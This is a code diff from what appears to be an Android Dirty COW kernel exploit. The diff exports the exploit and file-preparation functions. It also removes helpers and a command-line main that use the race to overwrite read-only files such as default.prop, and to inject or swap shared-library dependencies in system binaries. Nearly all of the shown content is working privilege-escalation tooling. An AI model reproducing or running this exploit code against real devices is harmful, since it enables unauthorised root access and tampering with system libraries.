@@ -1,23 +1,24 @@
 //
-// Created by k.leyfer on 15.03.2017.
+// Created by k.leyfer on 22.06.2017.
 //
 
 #include <malloc.h>
-#include "dirty_copy.h"
-#include "elf_parser.h"
-#include "file_utils.h"
+#include <fcntl.h>
+#include <string.h>
+#include <errno.h>
+#include <sys/stat.h>
+#include <unistd.h>
+#include <sys/mman.h>
+#include <sys/ptrace.h>
+#include <pthread.h>
+#include <sys/wait.h>
+#include "common.h"
+#include "logging.h"
+
+#define LOOP   0x1000000
+#define TIMEOUT 1000
 
 pid_t g_pid;
-
-struct mem_arg
-{
-  void* offset;
-  void* patch;
-  size_t patch_size;
-  const char* fname;
-  volatile int stop;
-  volatile int success;
-};
 
 static void* check_thread(void* arg)
 {
@@ -192,7 +193,7 @@ static void* proc_self_mem_thread(void* arg)
   return NULL;
 }
 
-static void exploit(struct mem_arg* mem_arg)
+void exploit(struct mem_arg* mem_arg)
 {
   pthread_t pth1, pth2, pth3;
 
@@ -256,7 +257,7 @@ static int open_file(const char* path, int* fd, size_t* size)
   return 0;
 }
 
-static int prepare_dirty_copy(const char* src_path, const char* dst_path, struct mem_arg* mem_arg)
+int prepare_dirty_copy(const char* src_path, const char* dst_path, struct mem_arg* mem_arg)
 {
   mem_arg->fname = dst_path;
 
@@ -316,128 +317,4 @@ static int prepare_dirty_copy(const char* src_path, const char* dst_path, struct
   close(dst_fd);
   mem_arg->offset = map;
   return 0;
-}
-
-int inject_dependency_into_library(const char* path, const char* dependency_name)
-{
-  struct mem_arg mem_arg;
-  if (prepare_dirty_copy(path, path, &mem_arg) == -1)
-  {
-    LOGV("Error preparing files!");
-    return -1;
-  }
-
-  struct strtab_entry soname = {
-      .type = NULL,
-      .value = NULL
-  };
-  struct dependencies_info dependencies;
-  get_strtable_values(mem_arg.patch, &dependencies, &soname);
-  if (soname.value != NULL)
-  {
-    *soname.type = DT_NEEDED;
-    strcpy(soname.value, dependency_name);
-    LOGV("soname: %lu: %s", *soname.type, soname.value);
-  }
-  else
-  {
-    LOGV("Unable to locate soname!");
-    free(dependencies.entries);
-    return -1;
-  }
-
-  free(dependencies.entries);
-  exploit(&mem_arg);
-  return 0;
-}
-
-int replace_dependency_in_binary(const char* path, const char* old_dependency,
-                                 const char* new_dependency)
-{
-  struct mem_arg mem_arg;
-  if (prepare_dirty_copy(path, path, &mem_arg) == -1)
-  {
-    LOGV("Error preparing files!");
-    return -1;
-  }
-
-  struct strtab_entry soname = {
-      .type = NULL,
-      .value = NULL
-  };
-  struct dependencies_info dependencies;
-  get_strtable_values(mem_arg.patch, &dependencies, &soname);
-
-  for (int i = 0; i < dependencies.size; ++i)
-  {
-    char* needed = dependencies.entries[i].value;
-    LOGV("needed: %s", needed);
-    if (strcmp(needed, old_dependency) == 0)
-    {
-      LOGV("Let's patch it");
-      strcpy(needed, new_dependency);
-    }
-  }
-
-  free(dependencies.entries);
-  exploit(&mem_arg);
-  return 0;
-}
-
-int dirty_copy(const char* src_path, const char* dst_path)
-{
-  struct mem_arg mem_arg;
-  if (prepare_dirty_copy(src_path, dst_path, &mem_arg) == -1)
-  {
-    LOGV("Unable to prepare files!");
-    return -1;
-  }
-
-  exploit(&mem_arg);
-
-  if (mem_arg.success == 0)
-  {
-    return -1;
-  }
-
-  return 0;
-}
-
-int main(int argc, const char* argv[])
-{
-  if (argc < 2)
-  {
-    LOGV("usage %s /data/local/tmp/default.prop /default.prop", argv[0]);
-    return 0;
-  }
-
-  if (strcmp(argv[1], "-c") == 0)
-  {
-    LOGV("Copy %s to %s", argv[2], argv[3]);
-    int res = copy_file(argv[2], argv[3]);
-    if (chmod(argv[3], 0777) != 0)
-    {
-      LOGV("Unable to chmod: %s", strerror(errno));
-    }
-
-    return res;
-  }
-
-  if (strcmp(argv[1], "-d") == 0)
-  {
-    LOGV("Dirty copy %s to %s", argv[2], argv[3]);
-    return dirty_copy(argv[2], argv[3]);
-  }
-
-  if (strcmp(argv[1], "-id") == 0)
-  {
-    LOGV("Inject dependency %s into %s", argv[3], argv[2]);
-    return inject_dependency_into_library(argv[2], argv[3]);
-  }
-
-  if (strcmp(argv[1], "-rd") == 0)
-  {
-    LOGV("Replace dependency in %s from %s to %s", argv[2], argv[3], argv[4]);
-    return replace_dependency_in_binary(argv[2], argv[3], argv[4]);
-  }
 }
